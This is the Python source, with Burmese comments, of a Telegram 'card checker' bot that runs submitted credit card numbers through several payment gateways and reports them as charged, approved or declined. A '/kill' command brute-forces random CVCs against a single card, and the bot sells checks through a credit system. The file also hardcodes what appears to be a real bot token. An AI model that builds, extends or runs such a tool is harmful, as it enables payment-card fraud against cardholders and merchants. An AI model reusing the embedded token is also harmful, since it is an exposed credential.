import sqlite3
import logging
import time
import os
import random
import re # regex သုံးဖို့ import ထည့်ထားပါတယ်
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler, 
    MessageHandler, 
    filters, 
    ConversationHandler, 
    ContextTypes
)

# --- အရေးကြီးသွင်းကုန်များ ---
try:
    from gatet import Tele
    from gatet1 import Tele as Tele1
    from gatet2 import Tele as Tele2
    from gatet3 import Tele as Tele3
    from gatet4 import Tele as Tele4
    from hit_sender import send
except ImportError as e:
    print(f"Error: ဖိုင်တစ်ခုခု လိုအပ်နေသည် - {e}")

# --- CONFIGURATION ---
BOT_TOKEN = '8682439584:AAEZNqlGag6WzOsvB4odTkjc3TjNHqAgWN4' 
ADMIN_ID = 7954343626              

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Conversation State
UPLOAD_FILE = 1

# --- 🔎 ကတ်ထဲက အချက်အလက်များကို ပုံစံမျိုးစုံမှ ကောက်ယူပေးမည့် Function ---
def parse_card(cc):
    cc = cc.strip()
    n = mm = yy = cvc = ""

    card_match = re.search(r'\b\d{15,16}\b', cc)
    expiry_match = re.search(r'\b(\d{1,2})[\\/\-](\d{2,4})\b', cc)

    if card_match and expiry_match:
        n = card_match.group(0)
        mm = expiry_match.group(1)
        yy = expiry_match.group(2)
        remaining_text = cc.replace(n, "").replace(expiry_match.group(0), "")
        cvv_match = re.search(r'\b\d{3,4}\b', remaining_text)
        if cvv_match:
            cvc = cvv_match.group(0)
    else:
        numbers = re.findall(r'\d+', cc)
        if len(numbers) >= 4:
            n = numbers[0]
            mm = numbers[1]
            yy = numbers[2]
            cvc = numbers[3]

    if n and mm and yy:
        mm = str(int(mm))
        if len(yy) == 4:
            yy = yy[-2:]
            
    return n, mm, yy, cvc

# --- ၁။ ဖိုင်ဖျက်သည့် Command (/rmtxt filename) ---
async def remove_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    if not context.args:
        await update.message.reply_text("⚠️ သုံးစွဲပုံ- `/rmtxt proxy.txt`", parse_mode="Markdown")
        return

    filename = context.args[0]
    try:
        if os.path.exists(filename):
            os.remove(filename)
            await update.message.reply_text(f"✅ ဖိုင် **{filename}** ကို ဖျက်လိုက်ပါပြီ။", parse_mode="Markdown")
        else:
            await update.message.reply_text(f"❌ ဖိုင် **{filename}** ကို ရှာမတွေ့ပါ။", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

# --- ၂။ ဖိုင်အသစ်တင်သည့် Command (/addtxt) ---
async def start_addtxt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    await update.message.reply_text(
        "📁 ကျေးဇူးပြု၍ သင် Upload တင်လိုသော **.txt** ဖိုင်ကို ပို့ပေးပါ။\n\n"
        "(မတင်လိုတော့ပါက /cancel ဟု ရိုက်ပါ)", 
        parse_mode="Markdown"
    )
    return UPLOAD_FILE

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = await update.message.document.get_file()
    file_name = update.message.document.file_name

    if not file_name.endswith(('.txt', '.py')):
        await update.message.reply_text("❌ .txt/.py ဖိုင် အမျိုးအစားပဲ လက်ခံပါတယ်။ ပြန်ပို့ပေးပါ။")
        return UPLOAD_FILE

    try:
        await file.download_to_drive(file_name)
        await update.message.reply_text(f"✅ ဖိုင် **{file_name}** ကို အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ။", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ သိမ်းဆည်းရာတွင် အမှားအယွင်းရှိပါသည်- {e}")
    
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ လုပ်ဆောင်ချက်ကို ဖျက်သိမ်းလိုက်ပါပြီ။")
    return ConversationHandler.END

# --- DATABASE SETUP ---
def init_db():
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, credits INTEGER DEFAULT 0)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS gate_status (gate_name TEXT PRIMARY KEY, is_active INTEGER DEFAULT 1)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS card_history (user_id INTEGER, cc_number TEXT, check_count INTEGER DEFAULT 0, PRIMARY KEY (user_id, cc_number))''')
    
    try:
        cursor.execute("ALTER TABLE card_history ADD COLUMN last_check_time INTEGER DEFAULT 0")
        conn.commit()
        print("Successfully updated database: Added last_check_time column.")
    except sqlite3.OperationalError:
        print("Column 'last_check_time' already exists. Skipping update.")
    
    gates = [('au',), ('ad',), ('az',), ('kill',), ('sa',)]
    cursor.executemany('INSERT OR IGNORE INTO gate_status (gate_name) VALUES (?)', gates)
    conn.commit()
    conn.close()

def get_db_connection():
    return sqlite3.connect('bot_database.db')

def is_gate_on(gate_name):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT is_active FROM gate_status WHERE gate_name = ?", (gate_name,))
    result = cursor.fetchone()
    conn.close()
    return result[0] == 1 if result else False

# --- BOT COMMANDS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 မင်္ဂလာပါ! Yagami Light Checker မှ ကြိုဆိုပါတယ်။\n\n"
        "သုံးလို့ရတဲ့ Command များ -\n\n"
        "/register - အကောင့်ဖွင့်ပြီး Credit 10 ယူမယ်\n"
        "/balance - လက်ကျန် Credit စစ်မယ်\n"
        "/au - Authorize 1 နဲ့စစ်မယ် (1 Credit)\n"
        "/ad - Authorize 2 နဲ့စစ်မယ် (1 Credit)\n"
        "/az - Authorize 3 နဲ့စစ်မယ် (1 Credit)\n"
        "/kill - cc kill မယ် -  usa visa only (1 Credit)\n"
        "/sa - Stripe auth နဲ့စစ်မယ် (Free)\n\n"
        "ဆက်သွယ်ရန် - @strawhatchannel69"
    )
    
def is_chat_allowed(chat_id):
    filename = 'group.txt'
    if not os.path.exists(filename):
        return False
    try:
        with open(filename, 'r') as f:
            allowed_ids = [line.strip() for line in f.readlines() if line.strip()]
        return str(chat_id) in allowed_ids
    except Exception:
        return False

async def get_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    await update.message.reply_text(f"ဒီ Chat ရဲ့ ID ကတော့: `{chat_id}` ဖြစ်ပါတယ်", parse_mode="Markdown")

async def register(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    if cursor.fetchone():
        await update.message.reply_text("❌ သင် register လုပ်ပြီးသားပါ။")
    else:
        cursor.execute("INSERT INTO users (user_id, credits) VALUES (?, ?)", (user_id, 10))
        conn.commit()
        await update.message.reply_text("✅ Register အောင်မြင်သည်။ Credit 10 ရရှိသည်။")
    conn.close()

async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT credits FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    if result:
        await update.message.reply_text(f"💰 Balance: {result[0]}")
    else:
        await update.message.reply_text("⚠️ ကျေးဇူးပြု၍ အရင် /register လုပ်ပါ။")

# --- Card Check Logic ---
async def process_card_check(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_func, gate_name):
    if not is_gate_on(gate_name):
        await update.message.reply_text(f"❌ Gateway **{gate_name}** သည် လောလောဆယ် ပြုပြင်ထိန်းသိမ်းနေသောကြောင့် ခေတ္တပိတ်ထားပါသည်။")
        return

    user_id = update.effective_user.id
    username = update.effective_user.username or "NoUsername"
    current_chat_id = update.effective_chat.id
    is_free_group = is_chat_allowed(current_chat_id)
    
    if not context.args:
        await update.message.reply_text("⚠️ Card format မမှန်ကန်ပါ။ ဥပမာ- `/au cc|mm|yy|cvc`", parse_mode="Markdown")
        return

    cc = " ".join(context.args)
    conn = get_db_connection()
    cursor = conn.cursor()

    # ၁။ User & Credit စစ်ဆေးခြင်း
    user_data = None
    if not is_free_group and gate_name != "sa":
        cursor.execute("SELECT credits FROM users WHERE user_id = ?", (user_id,))
        user_data = cursor.fetchone()
    
        if not user_data or user_data[0] <= 0:
            await update.message.reply_text("❌ သင့်မှာ Credit မလုံလောက်တော့ပါ။" if user_data else "⚠️ ကျေးဇူးပြု၍ အရင် /register လုပ်ပါ။")
            conn.close()
            return

    # ၂။ Duplicate Check Logic
    current_time = int(time.time())
    one_day_seconds = 24 * 60 * 60
    
    cursor.execute("SELECT check_count, last_check_time FROM card_history WHERE user_id = ? AND cc_number = ?", (user_id, cc))
    history = cursor.fetchone()

    if history:
        count, last_time = history
        if (current_time - last_time) < one_day_seconds:
            if count >= 3:
                remaining_time = one_day_seconds - (current_time - last_time)
                hours_left = remaining_time // 3600
                minutes_left = (remaining_time % 3600) // 60
                await update.message.reply_text(
                    f"❌ <b>Duplicate check founded!</b>\n\nဒီကတ်ကို ၂၄ နာရီအတွင်း ၃ ကြိမ်စစ်ပြီးသွားပါပြီ။ "
                    f"နောက်ထပ် <b>{int(hours_left)} နာရီ {int(minutes_left)} မိနစ်</b> နေမှ ပြန်စစ်ပေးပါ။", 
                    parse_mode="HTML"
                )
                conn.close()
                return
        else:
            cursor.execute("UPDATE card_history SET check_count = 0 WHERE user_id = ? AND cc_number = ?", (user_id, cc))
            conn.commit()

    msg = await update.message.reply_text(f"🔍 Processing your card...")
    start_time = time.time()

    try:
        # === (က) /kill Command အတွက်ပဲ ၅ ကြိမ် Auto စစ်မည့် Logic ===
        if gate_name == "kill":
            # အပေါ်က အသစ်ဆောက်ထားတဲ့ parse_card ကို ခေါ်လိုက်တာပါ
            n, mm, yy, _ = parse_card(cc)
            
            if not n or not mm or not yy:
                await msg.edit_text("❌ ကတ်ဒေတာ မပြည့်စုံပါ သို့မဟုတ် Format မှားယွင်းနေပါသည်။")
                conn.close()
                return

            results_list = []
            total_checks = 10
            
            for i in range(1, total_checks + 1):
                await msg.edit_text(f"🔍 <b>Visa Killing... ({i}/{total_checks})</b> ⏳\nCard: <code>{n}|{mm}|{yy}</code>", parse_mode="HTML")
                
                rand_cvc = str(random.randint(100, 999))
                current_loop_cc = f"{n}|{mm}|{yy}|{rand_cvc}"
                
                # gate_func (Tele4) ကို အသုံးပြုပြီး စစ်ဆေးခြင်း
# gate_func (Tele4) ကို အသုံးပြုပြီး စစ်ဆေးခြင်း
                last = None
                retry_count = 5
                
                for retry in range(retry_count):
                    try:
                        last = str(gate_func(current_loop_cc))
                        error_text = last.lower()
                
                        # proxy timeout/error စာသားတွေပါရင် retry
                        if any(x in error_text for x in [
                            "timeout",
                            "proxy",
                            "connection aborted",
                            "connection error",
                            "read timed out",
                            "ssl",
                            "502",
                            "503",
                            "504"
                        ]):
                            if retry < retry_count - 1:
                                await msg.edit_text(
                                    f"🔄 Retry CVC ({i}/{total_checks})\n"
                                    f"Retrying proxy... ({retry+1}/{retry_count})"
                                )
                                time.sleep(2)
                                continue
                
                        break
                
                    except Exception as e:
                        err = str(e).lower()
                
                        if any(x in err for x in [
                            "timeout",
                            "proxy",
                            "connection",
                            "ssl",
                            "502",
                            "503",
                            "504"
                        ]):
                            if retry < retry_count - 1:
                                await msg.edit_text(
                                    f"🔄 Retry CVC ({i}/{total_checks})\n"
                                    f"Connection retry... ({retry+1}/{retry_count})"
                                )
                                time.sleep(2)
                                continue
                
                        last = "Proxy Error"
                        break
                
                # retry ၅ ကြိမ်လုံး fail
                if last is None:
                    last = "Proxy Timeout"
                
                last_lower = last.lower()
                
                if any(x in last_lower for x in ["success", "thank"]):
                    status = "Charged 💥"
                elif any(x in last_lower for x in ["succeeded"]):
                    status = "Approved 💥"
                else:
                    status = "Declined ❌"
                    
                results_list.append(f"<code>{current_loop_cc}</code> ➜ <b>{status}</b>")
                
                # Credit နှုတ်ခြင်း
                if not is_free_group and user_data:
                    cursor.execute("UPDATE users SET credits = credits - 1 WHERE user_id = ?", (user_id,))
                    conn.commit()

            if history:
                cursor.execute("UPDATE card_history SET check_count = check_count + 1, last_check_time = ? WHERE user_id = ? AND cc_number = ?", (current_time, user_id, cc))
            else:
                cursor.execute("INSERT INTO card_history (user_id, cc_number, check_count, last_check_time) VALUES (?, ?, 1, ?)", (user_id, cc, current_time))
            conn.commit()
            
            time_taken = round(time.time() - start_time, 2)
            combined_cc_results = "\n".join(results_list)
            
            send_response = send(combined_cc_results, "Visa Killed ✅", username, time_taken)
            await msg.edit_text(send_response, parse_mode="HTML")

        # === (ခ) တခြား Gateway Command များအတွက် ပုံမှန်အတိုင်း ၁ ကြိမ်ပဲ စစ်မည့် Logic ===
        else:
            last = None
            max_retry = 5
            
            for attempt in range(max_retry):
                try:
                    last = str(gate_func(cc))
            
                    # timeout / proxy fail စာသားတွေပါရင် retry
                    error_text = last.lower()
            
                    if any(x in error_text for x in [
                        "timeout",
                        "proxy",
                        "connection aborted",
                        "connection error",
                        "remote disconnected",
                        "read timed out",
                        "ssl",
                        "502",
                        "503",
                        "504"
                    ]):
                        if attempt < max_retry - 1:
                            await msg.edit_text(
                                f"⚠️ Proxy timeout detected...\n🔄 Retrying ({attempt+1}/{max_retry})"
                            )
                            time.sleep(2)
                            continue
            
                    # success or normal response
                    break
            
                except Exception as e:
                    err = str(e).lower()
            
                    if any(x in err for x in [
                        "timeout",
                        "proxy",
                        "connection",
                        "ssl",
                        "502",
                        "503",
                        "504"
                    ]):
                        if attempt < max_retry - 1:
                            await msg.edit_text(
                                f"⚠️ Connection error...\n🔄 Retrying ({attempt+1}/{max_retry})"
                            )
                            time.sleep(2)
                            continue
            
                    raise e
            
            # ၅ ကြိမ်လုံး fail သွားရင်
            if last is None:
                await msg.edit_text("❌ Proxy timeout after 5 retries.")
                conn.close()
                return
            
            if history:
                cursor.execute(
                    "UPDATE card_history SET check_count = check_count + 1, last_check_time = ? WHERE user_id = ? AND cc_number = ?", 
                    (current_time, user_id, cc)
                )
            else:
                cursor.execute(
                    "INSERT INTO card_history (user_id, cc_number, check_count, last_check_time) VALUES (?, ?, 1, ?)", 
                    (user_id, cc, current_time)
                )
    
            if not is_free_group and user_data and gate_name != "sa":
                new_credits = user_data[0] - 1
                cursor.execute("UPDATE users SET credits = ? WHERE user_id = ?", (new_credits, user_id))
            
            conn.commit()
            
            last_lower = last.lower()
            if any(x in last_lower for x in ["success", "thank"]):
                last = "Charged 💥"
            elif any(x in last_lower for x in ["succeeded"]):
                last = "Approved 💥"
            
            time_taken = round(time.time() - start_time, 2)
            send_response = send(cc, last, username, time_taken)
            await msg.edit_text(send_response, parse_mode="HTML")
    
    except Exception as e:
        logging.error(f"Error: {e}")
        await msg.edit_text(f"❌ An error occurred: Try again.")
    
    conn.close()

# --- Gateway Commands ---
async def au_check(update: Update, context: ContextTypes.DEFAULT_TYPE): await process_card_check(update, context, Tele, "au")
async def ad_check(update: Update, context: ContextTypes.DEFAULT_TYPE): await process_card_check(update, context, Tele1, "ad")
async def az_check(update: Update, context: ContextTypes.DEFAULT_TYPE): await process_card_check(update, context, Tele2, "az")
async def kill_check(update: Update, context: ContextTypes.DEFAULT_TYPE): await process_card_check(update, context, Tele4, "kill")
async def sa_check(update: Update, context: ContextTypes.DEFAULT_TYPE): await process_card_check(update, context, Tele3, "sa")

async def add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try:
        target_id, amount = int(context.args[0]), int(context.args[1])
        conn = get_db_connection(); cursor = conn.cursor()
        cursor.execute("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, target_id))
        conn.commit(); conn.close()
        await update.message.reply_text(f"✅ User {target_id} +{amount} Credits.")
    except: await update.message.reply_text("Usage: /add [ID] [Amount]")

async def control_gate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try:
        gate_name, action = context.args[0].lower(), context.args[1].lower()
        status = 1 if action == "on" else 0
        conn = get_db_connection(); cursor = conn.cursor()
        cursor.execute("UPDATE gate_status SET is_active = ? WHERE gate_name = ?", (status, gate_name))
        conn.commit(); conn.close()
        await update.message.reply_text(f"✅ Gateway {gate_name} {action}.")
    except: await update.message.reply_text("Usage: /gate [au/ad/az/kill/sa] [on/off]")

if __name__ == '__main__':
    init_db()
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("register", register))
    app.add_handler(CommandHandler("balance", balance))
    app.add_handler(CommandHandler("au", au_check))
    app.add_handler(CommandHandler("ad", ad_check))
    app.add_handler(CommandHandler("az", az_check))
    app.add_handler(CommandHandler("kill", kill_check))
    app.add_handler(CommandHandler("sa", sa_check))
    app.add_handler(CommandHandler("add", add_credit))
    app.add_handler(CommandHandler("gate", control_gate))
    app.add_handler(CommandHandler("id", get_id))
    app.add_handler(CommandHandler("rmtxt", remove_file))
    
    add_txt_handler = ConversationHandler(
        entry_points=[CommandHandler('addtxt', start_addtxt)],
        states={
            UPLOAD_FILE: [MessageHandler(filters.Document.ALL, handle_document)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )
    app.add_handler(add_txt_handler)
    print("Bot is running...")
    app.run_polling()
